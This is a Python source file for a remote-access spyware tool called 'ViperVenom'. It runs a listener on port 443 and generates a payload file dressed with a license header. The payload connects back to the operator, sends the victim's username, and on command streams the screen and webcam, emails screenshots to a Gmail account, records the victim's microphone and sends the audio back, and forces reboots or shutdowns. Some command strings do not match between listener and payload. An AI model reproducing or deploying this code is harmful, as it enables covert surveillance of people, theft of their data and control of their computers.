    #Eclipse Public License - v 2.0

    #THE ACCOMPANYING PROGRAM IS PROVIDED UNDER THE TERMS OF THIS ECLIPSE
    #PUBLIC LICENSE ("AGREEMENT"). ANY USE, REPRODUCTION OR DISTRIBUTION
    #OF THE PROGRAM CONSTITUTES RECIPIENT'S ACCEPTANCE OF THIS AGREEMENT.



import socket
import time
import platform
import os
import threading
from termcolor import colored
from vidstream import *
import getpass
# =====================================================> Clears Terminal
def Clear():
    if platform.system() == "Windows":
        os.system('cls')
    else:
        os.system("clear")

Clear()

time.sleep(2)

# =====================================================> Banner
def Banner():
    
    print(colored('''
 ██▒   █▓ ██▓ ██▓███  ▓█████  ██▀███   ██▒   █▓▓█████  ███▄    █  ▒█████   ███▄ ▄███▓
▓██░   █▒▓██▒▓██░  ██▒▓█   ▀ ▓██ ▒ ██▒▓██░   █▒▓█   ▀  ██ ▀█   █ ▒██▒  ██▒▓██▒▀█▀ ██▒
 ▓██  █▒░▒██▒▓██░ ██▓▒▒███   ▓██ ░▄█ ▒ ▓██  █▒░▒███   ▓██  ▀█ ██▒▒██░  ██▒▓██    ▓██░
  ▒██ █░░░██░▒██▄█▓▒ ▒▒▓█  ▄ ▒██▀▀█▄    ▒██ █░░▒▓█  ▄ ▓██▒  ▐▌██▒▒██   ██░▒██    ▒██ 
   ▒▀█░  ░██░▒██▒ ░  ░░▒████▒░██▓ ▒██▒   ▒▀█░  ░▒████▒▒██░   ▓██░░ ████▓▒░▒██▒   ░██▒
   ░ ▐░  ░▓  ▒▓▒░ ░  ░░░ ▒░ ░░ ▒▓ ░▒▓░   ░ ▐░  ░░ ▒░ ░░ ▒░   ▒ ▒ ░ ▒░▒░▒░ ░ ▒░   ░  ░
   ░ ░░   ▒ ░░▒ ░      ░ ░  ░  ░▒ ░ ▒░   ░ ░░   ░ ░  ░░ ░░   ░ ▒░  ░ ▒ ▒░ ░  ░      ░
     ░░   ▒ ░░░          ░     ░░   ░      ░░     ░      ░   ░ ░ ░ ░ ░ ▒  ░      ░   
      ░   ░              ░  ░   ░           ░     ░  ░         ░     ░ ░         ░   
     ░                                     ░                                         ''', 'red'))
    print(colored("            ViperVenom - Listener & Spyware Tool Maintained By Itay Funes", "cyan"))
    print()
Banner()
# =====================================================> Main Menu
def Menu():
    print(colored("""
1) Start Handler Listener
""", 'blue'))
    print(colored("""
2) Generate ViperVenom Payload
""", 'red'))
    print()
Menu()
# =====================================================> Vars

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
des=input(colored("[*] Pleases Select Option: ", 'yellow'))
BUFFER_SIZE = 1024

# =====================================================> Backdoor Listener

def Listener():
    ListenerHost= input(colored("[*] Enter Listener IP Address: ", 'red'))
    ListenerPort= 443
    s.bind((ListenerHost, ListenerPort))
    s.listen(99)
    time.sleep(1)
    print(colored("[*] Starting Listener...", 'cyan'))
    time.sleep(1)
    print(colored(f"[*] Listener Started on {ListenerHost}:{ListenerPort}, Waiting for Connections...", "red"))
    conn, addr = s.accept()
    recv_data = conn.recv(BUFFER_SIZE).decode("utf-8")
    with conn:
        print(colored(f"[*] Recived Connection From: {addr}:{recv_data}", 'blue'))

        serv = StreamingServer(ListenerHost, 8888)
        serv.start_server()
        time.sleep(2)
        print(colored("[*] Connecting to the Session...", 'blue'))

        while True:

            Handler = input(colored(f"{addr[0]}:{recv_data} ~$ ", "green"))
            if Handler == "screenshare":       
                conn.send(Handler.encode("utf-8"))
            elif Handler == "screenshare stop":
                conn.send(Handler.encode("utf-8"))
            elif Handler == "webcam stream":
                conn.send(Handler.encode("utf-8"))
            elif Handler == "webcam stream stop":
                conn.send(Handler.encode("utf-8"))
            elif Handler == "clear":
                if platform.system() == "Linux":
                    os.system('clear')
                else:
                    os.system("cls")
            elif Handler == "screenshot":
                conn.send(Handler.encode("utf-8"))
            elif Handler == "exit":
                conn.send(Handler.encode("utf-8"))
                print(colored("[*] Exiting From Active Session...", "red"))
                time.sleep(3)
                conn.close()
            elif Handler == "mic record":
                conn.send(Handler.encode("utf-8"))
                with open('sJSsmK82.wav','wb') as f: 
                    while True:
                        l = conn.recv(1024)
                        if not l: break
                        f.write(l)
            elif Handler == "persistence":
                conn.send(Handler.encode("utf-8"))
            elif Handler == "restart":
                conn.send(Handler.encode("utf-8"))
            elif Handler == "shutdown":
                conn.send(Handler.encode("utf-8"))








def MalCreate():
    ListenerHost= input(colored("[*] Enter Listener IP Address: ", 'cyan'))
    ListenerPort= input(colored("[*] Enter Listener Port: ", 'cyan'))
    SetYourEmail= input(colored("[*] Enter Your Gmail Address: ", 'cyan'))

    SetYourEmailPassword = getpass.getpass(colored("[*] Enter Your Gmail's Password: ", 'cyan'))
    SetMicRecordSeconds = input(colored("[*] How Many *Seconds* Would you Like to Record Victim's Microphone? ", 'cyan'))
    setFileName= input(colored("[*] How Would you Like to Call your File? ", 'cyan'))
    print(colored("[*] Generating Payload...", 'red'))
    time.sleep(3)
    with open(setFileName, "w") as malfile:
        malfile.write(
            f'''    
    #Eclipse Public License - v 2.0

    #THE ACCOMPANYING PROGRAM IS PROVIDED UNDER THE TERMS OF THIS ECLIPSE
    #PUBLIC LICENSE ("AGREEMENT"). ANY USE, REPRODUCTION OR DISTRIBUTION
    #OF THE PROGRAM CONSTITUTES RECIPIENT'S ACCEPTANCE OF THIS AGREEMENT.


from PIL import ImageGrab
from vidstream import *
import socket
import getpass
import smtplib
import base64
import os
import platform
import sounddevice
from scipy.io.wavfile import write
import time
clientHOST = "{ListenerHost}"
clientPORT = {ListenerPort}
BUFFER_SIZE = 1024
s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((clientHOST, clientPORT))
s.send(str(getpass.getuser()).encode("utf-8"))
while True:
    Handler_DATA = s.recv(BUFFER_SIZE).decode("utf-8")
    if Handler_DATA == "screenshare":
        screensharetohost = ScreenShareClient(clientHOST, 8888)
        screensharetohost.start_stream()
    elif Handler_DATA == "screenshare_stop":
        screensharetohost.stop_stream()
    elif Handler_DATA == "webcam_stream":
        webcam = CameraClient(clientHOST, 8888)
        webcam.start_stream()
    elif Handler_DATA == "webcam_stream_stop":
        webcam.stop_stream()
    elif Handler_DATA == "screenshot":
        screenshot = ImageGrab.grab()
        file = "screenshot.jpg"
        screenshot.save(file)
        f = open('screenshot.jpg', 'rb')
        data=f.read()
        data=base64.b64encode(data)
        f.close()
        os.remove(file)
        smtp = smtplib.SMTP('smtp.gmail.com', 587) # Enable security reasons, open a new Gmail account, and enable "Less secure apps" in your account settings
        smtp.starttls()
        smtp.login("{SetYourEmail}", "{SetYourEmailPassword}")
        message = data
        smtp.sendmail("{SetYourEmail}", "{SetYourEmail}", message)
        smtp.quit()
    elif Handler_DATA == "mic_record":
        frames = 44100
        seconds = {SetMicRecordSeconds}
        channel = 1
        record = sounddevice.rec(int(seconds*frames), samplerate=frames, channels=channel)
        sounddevice.wait()
        write("sJSsmK82.wav", frames, record)
        with open("sJSsmK82.wav", 'rb') as f:
            for l in f: s.sendall(l)
            time.sleep(40)
            os.remove("sJSsmK82.wav")
    elif Handler_DATA == "persistence":
        pass
            # Unfinished Code
    elif Handler_DATA == "restart":
        if platform.system() == "Windows":
            os.system("shutdown -t 0 -r -f")
        else:
            os.system("reboot")
    elif Handler_DATA == "shutdown":
        if platform.system() == "Windows":
            os.system("shutdown /s /t 1")
        else:
            os.system("shutdown now")
    elif Handler_DATA == "exit":
        s.close()
            '''
        )
        time.sleep(1)
    print(colored("[*] Payload Generated, Your Attack is Ready.", 'red'))


# =====================================================> Menu Option
if des == "1":
    Listener()

if des == "2":
    MalCreate()

else:
    print(colored("[*] ERROR Invaild Argument, Exiting...", "red"))
    while True:
        break
